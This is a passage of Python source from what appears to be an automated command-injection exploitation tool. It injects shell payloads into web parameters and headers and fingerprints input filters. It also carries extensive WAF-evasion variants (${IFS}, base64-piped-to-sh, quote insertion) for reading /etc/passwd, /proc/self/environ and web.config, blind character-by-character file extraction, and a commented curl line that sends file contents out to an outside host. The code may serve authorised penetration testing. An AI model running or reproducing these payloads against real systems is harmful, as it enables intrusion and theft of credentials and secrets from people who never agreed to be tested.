          1. Per-param encoding state replace=True (set during fingerprinting) ->
             payload IS the full value; no appending.  Enforced for ALL tiers so
             no tier ever sends malformed input like "testYWQ=" to a decoder endpoint.
          2. Structural prefix (newline, --, %, quotes) -> context-break, replace.
          3. Default -> append to existing base value.

        Change 7: header_inject endpoints — inject into request headers
        instead of query params/body. Uses a copy of self.client.headers
        to avoid mutating shared state across threads.
        """
        # Change 7: header injection path
        if endpoint.get("source") == "header_inject":
            # Build a header dict: copy existing headers, then set the
            # target header to the payload value. Restore after request.
            orig_headers = dict(self.client.headers)
            try:
                injected_headers = dict(orig_headers)
                injected_headers[param_name] = payload
                # Temporarily swap headers on the client for this one request.
                # This is thread-safe: each thread holds its own injected_headers
                # copy and restores the original immediately after.
                self.client.headers = injected_headers
                if endpoint["method"] == "GET":
                    result = self.client.get(endpoint["url"], endpoint["params"])
                else:
                    result = self.client.post(endpoint["url"],
                                             {**endpoint["hidden"], **endpoint["params"]})
            finally:
                # Always restore original headers even if request raises
                self.client.headers = orig_headers
            return result

        # Normal injection path (query params / POST body)
        enc_state = self._enc_for(param_name)
        base_val  = endpoint["params"].get(param_name, "")
        base_val  = "test" if str(base_val) == _ZP_PROBE_SENTINEL else base_val
        pl_lower  = payload.lower()
        if enc_state["replace"]:
            final_val = payload
        elif any(pl_lower.startswith(p) for p in self._REPLACE_PREFIXES):
            final_val = payload
        elif payload.startswith("'") or payload.startswith('"'):
            final_val = payload
        else:
            final_val = base_val + payload
        injected = {
            k: ("test" if str(v) == _ZP_PROBE_SENTINEL else v)
            for k, v in endpoint["params"].items()
        }
        injected[param_name] = final_val

        # Inst 5 — Mirror original content-type for POST:
        #   application/json → send as JSON body (injecting into string values)
        #   multipart/form-data → send as multipart
        #   default → form-encoded
        _ct = endpoint.get("content_type", "") or ""
        if endpoint["method"] == "GET":
            return self.client.get(endpoint["url"], injected)
        elif "json" in _ct.lower():
            # Build JSON body: inject payload into the target key, keep others
            import json as _j
            _json_body_dict = dict(injected)
            return self.client.post_json(endpoint["url"], _json_body_dict)
        elif "multipart" in _ct.lower():
            # Multipart: encode as form-encoded (urllib doesn't support multipart;
            # for filename-field injection, the endpoint dict carries
            # content_type="multipart" and param_name is the field key)
            return self.client.post(endpoint["url"], {**endpoint.get("hidden", {}), **injected})
        else:
            return self.client.post(endpoint["url"], {**endpoint["hidden"], **injected})

    def _baseline(self, endpoint):
        if endpoint["method"] == "GET":
            return self.client.get(endpoint["url"], endpoint["params"])
        _ct = endpoint.get("content_type", "") or ""
        if "json" in _ct.lower():
            import json as _j
            return self.client.post_json(endpoint["url"],
                                         {**endpoint.get("hidden", {}), **endpoint["params"]})
        else:
            return self.client.post(endpoint["url"], {**endpoint["hidden"], **endpoint["params"]})

    def _run_arg_inject_tier(self, endpoint, param, baseline_time, baseline_body,
                              redir_dirs, redir_file):
        """
        Inst 4 — Argument injection tier.
        Activated when sanitization detection confirms shell metachar are all
        blocked.  Generates payloads using only chars that survived the filter:
        hyphens, double-hyphen, alphanum, equals, slashes targeting flag and
        argument smuggling into common binaries (curl, wget, ping, openssl).
        Returns True if a vuln was confirmed.
        """
        key = (endpoint["url"], endpoint["method"], param)
        _survived = self._filter_fingerprints.get(key, frozenset())
        if "-" not in _survived and not _survived:
            vdim(f"  [{param}] arg-inject: hyphen not in survived chars")
            return False

        ARG_PAYLOADS = [
            ("--verbose",                          "arg: --verbose flag"),
            ("--debug",                            "arg: --debug flag"),
            (" --output /dev/tcp/127.0.0.1/9999",  "arg: curl --output SSRF"),
            (" -o /dev/tcp/127.0.0.1/9999",        "arg: curl -o SSRF"),
            (" --url http://127.0.0.1/",            "arg: curl --url SSRF"),
            (" -u root:root",                       "arg: curl -u cred"),
            (" --proxy http://127.0.0.1:8080/",    "arg: curl --proxy"),
            (" -- --verbose",                       "arg: -- separator"),
            ("-",                                   "arg: bare hyphen value"),
            ("--",                                  "arg: bare double-hyphen"),
        ]
        _safe_chars = (_survived | set(
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "0123456789 /:.="))

        found = False
        for pl_raw, desc in ARG_PAYLOADS:
            if not all(c in _safe_chars for c in pl_raw):
                continue
            try:
                ok, ev, used_pl, st, el, _ = self._run_payload(
                    endpoint, param, pl_raw, pl_raw, desc, "system:linux_user",
                    False, "linux", baseline_time, baseline_body, redir_dirs, redir_file)
                if ok:
                    self._record_vuln(
                        endpoint, param, used_pl, f"[ARG-INJECT] {desc}",
                        "system:linux_user", False, "linux", ev, st, el,
                        baseline_time, confirmed_sep=" ",
                        param_enc=self._enc_for(param)["encoding"])
                    found = True
                    break
            except Exception:
                pass
        return found


    def _fingerprint_filter(self, endpoint, param):
        """
        Inst 3 — Sanitization detection and filter fingerprinting.
        Send a probe containing the full shell metacharacter set and diff
        the reflected value against the sent value to infer which chars
        were stripped.  Stores fingerprint as frozenset on
        self._filter_fingerprints[(url,method,param)].
        Returns (allowed_chars: frozenset|None, escalate_arg_inject: bool).
        allowed_chars=None → no reflection detected.
        escalate_arg_inject=True → all shell metachar blocked → use arg-inject.
        """
        _SHELL_META = set(';|&$`\\\'\"(){}[]<>!#~^*?')
        probe_chars = "".join(sorted(_SHELL_META)) + "testINPUT"
        safe_val = str(endpoint["params"].get(param, ""))
        probe_val = safe_val + probe_chars
        try:
            if endpoint["method"] == "GET":
                r = self.client.get(endpoint["url"],
                                    {**endpoint["params"], param: probe_val})
            else:
                r = self.client.post(endpoint["url"],
                                     {**endpoint.get("hidden", {}),
                                      **endpoint["params"], param: probe_val})
            body = r.get("body", "") or ""
        except Exception:
            return None, False

        if probe_chars[:8] not in body and "testINPUT" not in body:
            return None, False  # no reflection → can't fingerprint

        # Per-char survival test
        survived = set()
        for ch in _SHELL_META:
            try:
                pv = safe_val + ch + "testINPUT"
                if endpoint["method"] == "GET":
                    rr = self.client.get(endpoint["url"],
                                         {**endpoint["params"], param: pv})
                else:
                    rr = self.client.post(endpoint["url"],
                                          {**endpoint.get("hidden", {}),
                                           **endpoint["params"], param: pv})
                rb = rr.get("body", "") or ""
                if ch in rb or "testINPUT" in rb:
                    survived.add(ch)
            except Exception:
                pass

        fp = frozenset(survived)
        key = (endpoint["url"], endpoint["method"], param)
        self._filter_fingerprints[key] = fp
        self._survived_chars[key] = fp  # Tier 5 compatibility

        escalate = not bool(fp & _SHELL_META)
        if escalate:
            vdim(f"  [{param}] filter blocks ALL shell metachar → escalating to arg-inject tier")
        else:
            vdim(f"  [{param}] filter survived: {''.join(sorted(fp))!r}")
        return fp, escalate

    def _adaptive_time_baseline(self, endpoint, param):
        """
        Inst 2 — Adaptive per-endpoint timing baseline.
        Determines if the endpoint is too slow/noisy for reliable time-based
        detection WITHOUT firing extra requests per param.

        Uses the endpoint-level baseline already computed in test_endpoint
        (stored in self._last_baseline_time) rather than sending 3 more requests
        per param.  Only falls back to sampling when no prior baseline exists.

        Returns (avg, stdev, skip_timing) where skip_timing=True means the
        endpoint is inherently slow — skip time probes for this param.
        Results cached per (url, method, param).
        """
        key = (endpoint["url"], endpoint["method"], param)
        if key in self._ep_timing_baseline:
            cached = self._ep_timing_baseline[key]
            return cached["avg"], cached["stdev"], cached["skip"]

        # Use the endpoint-level baseline time already computed (no extra requests)
        avg = getattr(self, '_last_baseline_time', 0.0) or 0.0
        stdev = 0.0  # single sample — conservative, don't inflate

        # Skip timing only if endpoint is genuinely slow (avg >= 8s).
        # Using 6s was too aggressive — a legitimate 5s sleep on a 0.5s endpoint
        # wouldn't be caught if avg was measured mid-test as ~6s.
        skip = avg >= 8.0
        if skip:
            vdim(f"  [{param}] timing baseline unsuitable (baseline={avg:.2f}s) — skip time probes")

        self._ep_timing_baseline[key] = {"avg": avg, "stdev": stdev, "skip": skip}
        return avg, stdev, skip

    def _sep(self, tmpl):
        for s in [";", "&&", "|", "&", "$("]:
            if tmpl.startswith(s):
                return s
        return ";"

    def _resolve_redirect_payload(self, tmpl, redirect_dir, redirect_file):
        return (tmpl
                .replace("REDIRECT_DIR", redirect_dir.rstrip("/"))
                .replace("REDIRECT_FILE", redirect_file))

    def _resolve_oob_payload(self, tmpl):
        return (tmpl
                .replace("COLLAB_URL",  self.collab_url  or "")
                .replace("COLLAB_HOST", self.collab_host or ""))

    def _try_redirect(self, endpoint, param_name, tmpl, redirect_dir, redirect_file, baseline_body):
        base = endpoint["url"]
        parsed_b = urllib.parse.urlparse(base)
        read_url_path = (self.read_path or
                         redirect_dir.replace("/var/www", "")
                                     .replace("/usr/share/nginx/html", "")
                                     .replace("/usr/share/apache2/default-site", ""))
        read_url_path = read_url_path.rstrip("/") + "/" + redirect_file
        read_url = urllib.parse.urlunparse((
            parsed_b.scheme, parsed_b.netloc,
            read_url_path, "", "", ""
        ))

        # Pre-write probe: fetch the read URL before writing.
        # If the server returns 404, this redirect dir is inaccessible — bail
        # immediately without firing the injection payload for this dir.
        pre_write_resp = self.client.get(read_url)
        redirect_baseline = pre_write_resp.get("body", "")
        _pre_status = pre_write_resp.get("status", 0)

        if _pre_status == 404:
            # This dir is not served — skip injection entirely for this dir.
            # Return _was_404=True so the caller can track consecutive misses.
            return False, "", "", True

        pl = self._resolve_redirect_payload(tmpl, redirect_dir, redirect_file)
        self._send(endpoint, param_name, pl)

        read_resp = self.client.get(read_url)
        read_body = read_resp.get("body", "")

        # Use redirect_baseline (pre-write state of the read URL) as the
        # comparison baseline — not the original endpoint body.
        ok, evidence = self.verifier.verify_system("linux_user", read_body, redirect_baseline)
        if ok:
            return True, pl, evidence + f" (read from {read_url})", False
        ok2, ev2 = self.verifier.verify_system("linux_id", read_body, redirect_baseline)
        if ok2:
            return True, pl, ev2 + f" (read from {read_url})", False
        return False, pl, "", False

    def _try_oob(self, endpoint, param_name, tmpl, verify_type, baseline_body,
                 collab_client=None):
        """
        Fire OOB payload and verify via:
          (a) collab_client.poll() — external Burp collaborator
          (b) self._oob_server.poll() — self-hosted daemon listener
        Returns False if NEITHER confirms a callback within the poll window.
        Firing the payload and assuming success generates false positives.
        """
        pl = self._resolve_oob_payload(tmpl)
        self._send(endpoint, param_name, pl)

        # Path (a): external collaborator — highest confidence
        if collab_client:
            hit, data = collab_client.poll(timeout=15)
            if hit:
                ev = f"OOB interaction confirmed — collaborator received: {data[:80]}"
                return True, pl, ev
            return False, pl, ""

        # Path (b): self-hosted OOB listener — poll 8-12s
        # Poll window: randomised between 8 and 12 seconds to avoid
        # fixed-interval fingerprinting by WAFs.
        import random as _rand
        _poll_t = _rand.randint(8, 12)
        if hasattr(self, '_oob_server') and self._oob_server._server is not None:
            hit, hit_path = self._oob_server.poll(self.token, timeout=_poll_t)
            if hit:
                ev = (f"OOB callback confirmed — self-hosted listener received: "
                      f"{hit_path[:100]}")
                return True, pl, ev
            vdim(f"  [oob] poll window {_poll_t}s elapsed — no callback received")
            return False, pl, ""

        # No verification path available — refuse to confirm
        vdim("  [oob] no collab_client and no oob_server — skipping OOB tier")
        return False, pl, ""

    def _run_payload(self, endpoint, param, pl, pl_tmpl, desc, verify_type,
                     is_time, pl_os, baseline_time, baseline_body,
                     redir_dirs, redir_file,
                     use_differential_timing=False,
                     precomputed_resp=None):
        """
        Fire one payload. Returns (is_real, evidence, used_pl, resp_status, resp_elapsed).
        use_differential_timing: passes endpoint to verify_time for 3-sample baseline median.
        precomputed_resp: if set, skip _send() and use this dict (from multi-sample tier 2).
        """
        used_pl = pl

        if verify_type.startswith("redirect:"):
            _redir_404_count = 0
            for rdir in redir_dirs:
                ok, used_pl, ev, _was_404 = self._try_redirect(
                    endpoint, param, pl_tmpl, rdir, redir_file, baseline_body)
                if _was_404:
                    _redir_404_count += 1
                if ok:
                    return True, ev, used_pl, 200, 0.0, _redir_404_count
            return False, "", used_pl, 0, 0.0, _redir_404_count

        if verify_type in ("oob", "oob_data"):
            ok, used_pl, ev = self._try_oob(
                endpoint, param, pl_tmpl, verify_type, baseline_body)
            return ok, ev, used_pl, 200, 0.0

        # Standard: send or use precomputed response (multi-sample tier 2)
        resp = precomputed_resp if precomputed_resp is not None else self._send(endpoint, param, pl)
        if resp["status"] == 0 and not is_time:
            vdim(f"  [payload] {desc!r} → status=0 (network/timeout) — skip")
            return False, "", pl, 0, 0.0, 0
        # ── Late-discovery path extraction (Fix 2) ──────────────────────────
        # Run on EVERY response body immediately after receipt, before any
        # static-skip or verify logic.  Uses _late_discovered_paths set so
        # paths accumulate across all payloads fired at this endpoint and are
        # drained by run() after the endpoint finishes.
        _resp_body_raw = resp.get("body") or ""
        if _resp_body_raw:
            # Stash for legacy late-discovery body reader (kept for compat)
            _lrb = getattr(self, '_last_response_bodies', None)
            if _lrb is not None:
                _lrb.append(_resp_body_raw)
            # New: immediate path extraction into dedicated set
            _ld_set = getattr(self, '_late_discovered_paths', None)
            if _ld_set is not None:
                _resp_ct = resp.get("headers", {}).get("content-type", "").lower()
                if "json" in _resp_ct or _resp_body_raw.lstrip().startswith(("{", "[")):
                    try:
                        import json as _ld_json
                        _ld_data = _ld_json.loads(_resp_body_raw)
                        _SLUG_RE = re.compile(r'^/[a-zA-Z0-9]{5,12}$')
                        _STATIC_LD = re.compile(
                            r'\.(js|css|png|jpg|gif|svg|ico|woff|map|pdf|ttf|eot)$', re.I)
                        def _ld_walk(node):
                            if isinstance(node, dict):
                                for v in node.values(): _ld_walk(v)
                            elif isinstance(node, list):
                                for item in node: _ld_walk(item)
                            elif isinstance(node, str):
                                v = node.strip()
                                if (v.startswith("/") and 3 <= len(v) <= 80
                                        and " " not in v
                                        and "http" not in v
                                        and "://" not in v
                                        and not _STATIC_LD.search(v)
                                        and not v.startswith("//")
                                        and ("/" in v[1:] or bool(_SLUG_RE.match(v)))):
                                    _ld_set.add(v.split("?")[0].rstrip("/") or "/")
                        _ld_walk(_ld_data)
                    except Exception:
                        pass
        # Per-param static-response skip.
        # IMPORTANT: time-based payloads are NEVER skipped based on body hash —
        # a blind injection endpoint returns the same body as baseline by design.
        # Per-param static-response skip: only applies to TIME-BASED payloads.
        #
        # RESTORED to old behaviour: for echo/system verify types we NEVER skip
        # based on body hash — the injected command output may appear in a JSON
        # field or partial response that differs even if the overall hash matches.
        # Skipping direct-output payloads on body-hash equality was the primary
        # regression vs the old version: it caused ALL Tier 1 payloads to return
        # False before the verifier ever inspected them.
        #
        # For time-based payloads: if body is identical to baseline, the endpoint
        # is not executing the param at all — safe to skip (timing won't differ).
        if is_time and not verify_type.startswith(("redirect:", "oob")):
            _pb = getattr(self, '_current_param_baseline', (None, None))
            if _pb[0] is not None:
                import hashlib as _hl2
                _rb = resp.get("body", "") or ""
                _rh = _hl2.md5(_rb.encode(errors="replace")).hexdigest()
                if _rh == _pb[0] and len(_rb) == _pb[1]:
                    vdim(f"  [{param}] time-skip: response identical to baseline (param not reflected)")
                    return False, "", pl, resp["status"], resp["elapsed"], 0

        # Verbose: show payload being tested
        _pl_preview = pl[:80] + ('...' if len(pl) > 80 else '')
        vdim(f"  [{param}] trying {verify_type!r} | {desc} | payload: {_pl_preview}")

        if verify_type == "echo":
            if self.token.lower() not in resp.get("body", "").lower():
                vdim(f"  [{param}] echo: token not in response body — skip")
                return False, "", pl, resp["status"], resp["elapsed"], 0
            is_real, ev = self.verifier.verify_echo(
                endpoint, param, self._sep(pl_tmpl), resp["body"], baseline_body)
        elif verify_type.startswith("system:"):
            is_real, ev = self.verifier.verify_system(
                verify_type.split(":", 1)[1], resp.get("body", ""), baseline_body)
            # Secondary sleep confirmation: if pattern matched, attempt to verify
            # actual code execution by firing a short sleep and checking for delay.
            # FIX: sleep cross-check is now a SOFT CONFIDENCE ANNOTATOR, not a hard
            # gate. A confirmed `uid=0(root)` or `root:x:0:0` in the response body
            # is high-specificity evidence of RCE — it does NOT appear by coincidence.
            # Sleep can legitimately fail on simple test apps (different user env, no
            # sleep binary in PATH, IFS obfuscation not needed, sandbox kill, etc.).
            # Failing sleep DOES NOT mean the pattern match is wrong.
            #
            # PASS → annotate ev with [RCE-CONFIRMED] (sleep corroborated)
            # FAIL → annotate ev with [NO-SLEEP-CONFIRM — pattern match only]
            #         is_real stays True — finding is preserved
            if is_real and verify_type in ("system:linux_user", "system:linux_id"):
                sys.stdout.write(f"\r  {color(f'  [{param}] sleep-confirm cross-check...', C.DIM)}  ")
                sys.stdout.flush()
                sep = self._sep(pl_tmpl)
                _sleep_pl  = sep + "sleep${IFS}5"
                _sleep_r   = self._send(endpoint, param, _sleep_pl)
                _sleep_ok, _sleep_ev = self.verifier.verify_time(
                    _sleep_r.get("elapsed", 0), baseline_time, self.time_threshold)
                if _sleep_ok:
                    vdim(f"  [{param}] sleep cross-check PASSED ({_sleep_r.get('elapsed',0):.2f}s) — RCE corroborated")
                    ev = f"[RCE-CONFIRMED] {ev}"
                else:
                    vdim(f"  [{param}] sleep cross-check FAILED ({_sleep_r.get('elapsed',0):.2f}s) — pattern match preserved (sleep env may differ)")
                    ev = f"[NO-SLEEP-CONFIRM — pattern match only] {ev}"
                    # is_real intentionally NOT set to False — linux_user/linux_id
                    # structural patterns are high-specificity and do not appear by
                    # coincidence. Sleep failure is a confidence signal, not a veto.
        elif verify_type == "time":
            if use_differential_timing:
                is_real, ev = self.verifier.verify_time(
                    resp["elapsed"], baseline_time, self.time_threshold,
                    endpoint=endpoint, param_name=param,
                    separator=self._sep(pl_tmpl), client=self.client,
                    blind_context=True)   # time-based = output suppressed → more sensitive
            else:
                is_real, ev = self.verifier.verify_time(
                    resp["elapsed"], baseline_time, self.time_threshold)
            vdim(f"  [{param}] time: elapsed={resp['elapsed']:.2f}s baseline={baseline_time:.2f}s → {'CONFIRMED' if is_real else 'no'}")
        else:
            return False, "", pl, resp["status"], resp["elapsed"], 0

        # Verbose: show verify result
        if is_real:
            vdim(f"  [{param}] ✓ CONFIRMED — {ev[:120]}")
        else:
            _reason = ev[:80] if ev else 'no match'
            vdim(f"  [{param}] ✗ rejected — {_reason}")
            # Verbose: show response snippet on rejection so analyst can inspect
            _body_snip = resp.get('body', '')[:200].replace('\n', ' ').replace('\r', '')
            vdim(f"  [{param}]   response snippet: {_body_snip}")

        return is_real, ev, pl, resp["status"], resp["elapsed"], 0

    # ── File read machinery (original — FULLY PRESERVED) ─────────────────────

    _PASSWD_LINE_RE = re.compile(
        r"(?:^|[\n\r<>|])([a-zA-Z_][a-zA-Z0-9_\-.]{0,31}"
        r":[x*!Uu]?\$?[0-9a-fA-F]*:\d+:\d+:[^:\n\r<>]{0,80}"
        r":[/~][^:\n\r<>]{0,80}:[/a-zA-Z][^\n\r<>]{0,60})",
        re.MULTILINE
    )
    _HOSTS_LINE_RE  = re.compile(
        r"(?:^|[\n\r])[ \t]*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}[ \t]+[^\n\r<>]{1,80})",
        re.MULTILINE
    )
    _PROCVER_RE     = re.compile(r"Linux version [^\n\r<>]{10,150}", re.I)
    _OSREL_LINE_RE  = re.compile(r"(?:^|[\n\r])([A-Z_]+=(?:\"[^\"]*\"|[^\n\r<>]*))", re.M)
    _ENVIRON_RE     = re.compile(r"([A-Z_][A-Z0-9_]{1,40}=[^\n\r\x00<>]{1,200})", re.M)

    @staticmethod
    def _strip_html(body):
        text = re.sub(r'<style[^>]*>.*?</style>', ' ', body, flags=re.I|re.S)
        text = re.sub(r'<script[^>]*>.*?</script>', ' ', text, flags=re.I|re.S)
        text = re.sub(r'<(?:br|p|div|tr|li|pre|h\d|span)[^>]*>', '\n', text, flags=re.I)
        text = re.sub(r'<[^>]+>', ' ', text)
        text = (text.replace('&lt;','<').replace('&gt;','>')
                    .replace('&amp;','&').replace('&quot;','"')
                    .replace('&nbsp;',' ').replace('&#39;',"\'"))
        lines = [l.strip() for l in text.splitlines()]
        return '\n'.join(l for l in lines if l)

    @staticmethod
    def _ext_passwd(body):
        text = Injector._strip_html(body)
        pat = re.compile(
            r"([a-zA-Z_][a-zA-Z0-9_\-.]{0,31}"
            r":[x*!Uu]?\d*:\d+:\d+:[^:\n\r]{0,64}"
            r":[/~][^:\n\r]{0,80}:[/a-zA-Z][^\n\r]{0,50})",
            re.M
        )
        lines = pat.findall(text)
        if lines:
            return "\n".join(l.strip() for l in lines)
        found = []
        for line in text.splitlines():
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split(":")
            if len(parts) >= 7 and parts[2].strip().isdigit() and parts[3].strip().isdigit():
                found.append(line)
        return "\n".join(found) if found else ""

    @staticmethod
    def _ext_hosts(body):
        text = Injector._strip_html(body)
        lines = []
        for line in text.splitlines():
            line = line.strip()
            if re.match(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line):
                lines.append(line)
        return "\n".join(lines) if lines else ""

    @staticmethod
    def _ext_procver(body):
        text = Injector._strip_html(body)
        m = re.search(r"Linux version [^\n\r]{10,150}", text, re.I)
        return m.group(0).strip() if m else ""

    @staticmethod
    def _ext_osrel(body):
        text = Injector._strip_html(body)
        lines = []
        for line in text.splitlines():
            line = line.strip()
            if re.match(r"[A-Z_]+=", line) and not line.startswith("#"):
                lines.append(line)
        return "\n".join(lines) if lines else ""

    @staticmethod
    def _ext_environ(body):
        cleaned = body.replace("\x00", "\n").replace("\\x00", "\n")
        text = Injector._strip_html(cleaned)
        lines = []
        for line in re.split(r"[\n\r]", text):
            line = line.strip()
            if re.match(r"[A-Z_][A-Z0-9_]{1,40}=", line):
                if not re.search(r"[<>{}();]", line):
                    lines.append(line)
        return "\n".join(lines) if lines else ""

    _LINUX_FILES = [
        ("/etc/passwd",
         "cat {f}",
         re.compile(r"[a-zA-Z_]\w{0,31}:[x*!Uu]?\d*:\d+:\d+:[^\n<]{0,80}:/"),
         _ext_passwd),

        ("/etc/hosts",
         "cat {f}",
         re.compile(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"),
         _ext_hosts),

        ("/proc/version",
         "cat {f}",
         re.compile(r"Linux version \d+\.\d+", re.I),
         _ext_procver),

        ("/etc/os-release",
         "cat {f}",
         re.compile(r"(?:^|[\n\r])NAME=", re.M),
         _ext_osrel),

        ("/proc/self/environ",
         "cat {f}",
         re.compile(r"(?:PATH|HOME|USER|SHELL|PWD)="),
         _ext_environ),
    ]

    _WIN_FILES = [
        ("C:\\Windows\\System32\\drivers\\etc\\hosts",
         "type {f}",
         re.compile(r"127\.0\.0\.1\s+localhost", re.I),
         lambda body: Injector._ext_hosts(body)),

        ("C:\\Windows\\win.ini",
         "type {f}",
         re.compile(r"\[fonts\]|\[extensions\]|\[mci", re.I),
         lambda body: "\n".join(
             l.strip() for l in Injector._strip_html(body).splitlines()
             if l.strip() and not l.strip().startswith(("<","{"," "))
         )),

        ("C:\\Windows\\System32\\license.rtf",
         "type {f}",
         re.compile(r"Microsoft|Windows", re.I),
         lambda body: Injector._strip_html(body).strip()),

        ("C:\\inetpub\\wwwroot\\web.config",
         "type {f}",
         re.compile(r"<configuration>|<system\.web>|connectionString", re.I),
         lambda body: Injector._strip_html(body).strip()),

        ("C:\\Windows\\System32\\drivers\\etc\\networks",
         "type {f}",
         re.compile(r"loopback|link-local", re.I),
         lambda body: Injector._strip_html(body).strip()),

        ("%SYSTEMROOT%\\System32\\drivers\\etc\\hosts",
         "type {f}",
         re.compile(r"127\.0\.0\.1", re.I),
         lambda body: Injector._strip_html(body).strip()),
    ]

    # ── CAT variants: spaces replaced with ${IFS} / tab / brace expansion ────
    # All variants are space-free so they bypass "no spaces" WAF rules.
    # B64-encoded versions are tried when plain text is WAF-filtered.
    _CAT_VARIANTS = [
        # Standard space (baseline — tried first, stripped if server blocks spaces)
        ("standard",         lambda f: f"cat {f}"),
        # ── IFS space bypass ──────────────────────────────────────────────
        ("ifs",              lambda f: f"cat${{IFS}}{f}"),
        ("ifs-subshell",     lambda f: f"$(cat${{IFS}}{f})"),
        ("ifs-backtick",     lambda f: f"`cat${{IFS}}{f}`"),
        # ── Tab space bypass (\t — raw tab, passes ' ' string checks) ─────
        ("tab",              lambda f: f"cat\t{f}"),
        ("tab-subshell",     lambda f: f"$(cat\t{f})"),
        # ── Brace expansion (no separator at all) ─────────────────────────
        ("brace",            lambda f: "{cat," + f + "}"),
        ("brace-subshell",   lambda f: "$({cat," + f + "})"),
        # ── Alternative read commands (IFS-safe) ─────────────────────────
        ("head",             lambda f: f"head${{IFS}}-n${{IFS}}99${{IFS}}{f}"),
        ("tail",             lambda f: f"tail${{IFS}}-n${{IFS}}99${{IFS}}{f}"),
        ("tac",              lambda f: f"tac${{IFS}}{f}"),
        ("less",             lambda f: f"less${{IFS}}{f}"),
        ("more",             lambda f: f"more${{IFS}}{f}"),
        ("od",               lambda f: f"od${{IFS}}-c${{IFS}}{f}"),
        ("awk",              lambda f: f"awk${{IFS}}'{{print}}'${{IFS}}{f}"),
        ("sed",              lambda f: f"sed${{IFS}}'p'${{IFS}}{f}"),
        # ── Base64 read (output is b64 — decoded by _maybe_decode_base64) ─
        ("base64",           lambda f: f"base64${{IFS}}{f}"),
        ("base64-tab",       lambda f: f"base64\t{f}"),
        # ── Quote-insert obfuscation ──────────────────────────────────────
        ("quote-insert",     lambda f: f"ca''t${{IFS}}{f}"),
        ("case-var",         lambda f: f"CaT${{IFS}}{f}"),
        # ── Context-break payloads ────────────────────────────────────────
        ("newline-prefix",   lambda f: f"\ncat${{IFS}}{f}"),
        ("qbreak-squote",    lambda f: f"';cat${{IFS}}{f} #"),
        ("qbreak-dquote",    lambda f: '";cat${IFS}' + f + ' #'),
        # ── B64-wrapped commands (bypass keyword + space filters) ─────────
        # Built dynamically in _build_direct_payloads using _b64_file_cmd()
    ]

    _TYPE_VARIANTS_WIN = [
        ("standard",        lambda f: f"type {f}"),
        ("case-var",        lambda f: f"TYPE {f}"),
        ("cmd-wrap",        lambda f: f"cmd /c type {f}"),
        ("powershell",      lambda f: f'powershell -Command "Get-Content \'{f}\'"'),
        ("ps-short",        lambda f: f"powershell -c gc {f}"),
    ]

    # ── B64-encode a file-read command (IFS-safe, WAF-evading) ───────────────
    @staticmethod
    def _b64_file_cmd(cmd: str) -> str:
        """
        Base64-encode a file-read shell command.
        Usage: echo <b64>|base64 -d|sh
        This passes through WAFs that inspect plaintext for 'cat', spaces etc.
        Example: _b64_file_cmd("cat${IFS}/etc/passwd")
              → "echo Y2F0JHtJRlN9L2V0Yy9wYXNzd2Q=|base64 -d|sh"
        """
        import base64 as _b
        enc = _b.b64encode(cmd.encode()).decode()
        return f"echo {enc}|base64 -d|sh"

    @staticmethod
    def _dbl_b64_file_cmd(cmd: str) -> str:
        """
        Double-Base64-encode a file-read command for multi-layer WAF bypass.
        Usage: echo <b64(b64(cmd))>|base64 -d|base64 -d|sh
        """
        import base64 as _b
        inner = _b.b64encode(cmd.encode()).decode()
        outer = _b.b64encode(inner.encode()).decode()
        return f"echo {outer}|base64 -d|base64 -d|sh"

    # ── Blind file-read probes ────────────────────────────────────────────────
    # Used by _try_file_read Strategy C (blind/time-based character extraction)
    # when the endpoint has no reflected output.
    #
    # Three blind strategies:
    #   C1) Existence check: if [ -f <file> ]; then sleep 5; fi
    #   C2) Char-by-char: if [ "$(head -c 1 <file>)" = "<c>" ]; then sleep 5; fi
    #   C3) OOB exfil: curl${IFS}http://HOST?d=$(cat${IFS}<file>|base64)
    #
    # C1 proves the file exists (fast, single request).
    # C2 extracts one byte per round-trip (slow but no OOB needed).
    # C3 exfiltrates the full file via self-hosted OOB server (fast, no output needed).

    @staticmethod
    def _blind_exist_cmd(fpath: str, delay: int = 5) -> str:
        """if [ -f <fpath> ]; then sleep <delay>; fi — space-free via ${IFS}."""
        return (f"if${{IFS}}[${{IFS}}-f${{IFS}}{fpath}${{IFS}}];${{IFS}}"
                f"then${{IFS}}sleep${{IFS}}{delay};${{IFS}}fi")

    @staticmethod
    def _blind_exist_cmds(fpath: str, delay: int = 5) -> list:
        """
        Return multiple alternative existence-check commands that don't rely
        on sleep alone. Tried in order — first one that produces the expected
        delay is used as the confirmed oracle for char extraction.

        Alternatives (all IFS-safe, no plain spaces):
          1. sleep  — standard, blocked on some targets
          2. ping   — ping -c N localhost burns N seconds, works without sleep
          3. read   — read -t N from /dev/null burns N seconds
          4. dd     — dd if=/dev/urandom of=/dev/null bs=1M count=N burns time
          5. yes    — yes|head -c 1M|wc -c burns ~1s (rough)
        """
        cmds = []
        ifs = "${IFS}"
        # 1. sleep
        cmds.append((
            f"if{ifs}[{ifs}-f{ifs}{fpath}{ifs}];{ifs}then{ifs}sleep{ifs}{delay};{ifs}fi",
            "sleep"
        ))
        # 2. ping (ping -c <delay> 127.0.0.1 burns delay seconds)
        cmds.append((
            f"if{ifs}[{ifs}-f{ifs}{fpath}{ifs}];{ifs}then{ifs}"
            f"ping{ifs}-c{ifs}{delay}{ifs}127.0.0.1{ifs}>/dev/null{ifs}2>&1;{ifs}fi",
            "ping"
        ))
        # 3. read -t (burns N seconds waiting on stdin from /dev/null)
        cmds.append((
            f"if{ifs}[{ifs}-f{ifs}{fpath}{ifs}];{ifs}then{ifs}"
            f"read{ifs}-t{ifs}{delay}{ifs}</dev/null;{ifs}fi",
            "read-t"
        ))
        return cmds

    @staticmethod
    def _blind_char_cmds(fpath: str, pos: int, char: str, delay: int = 5,
                         delay_method: str = "sleep") -> list:
        """
        Return multiple alternative char-extraction commands using different
        delay mechanisms. delay_method is the one confirmed to work by
        _blind_exist_cmds — so the matching method is tried first.
        """
        ifs = "${IFS}"
        extract = (
            f"$(head{ifs}-c{ifs}{pos+1}{ifs}{fpath}"
            f"{ifs}|{ifs}tail{ifs}-c{ifs}1)"
        )
        cond = f"if{ifs}[\"{extract}\"{ifs}={ifs}\"{char}\"{ifs}]"
        cmds = []
        # Build delay body for each method
        delay_bodies = [
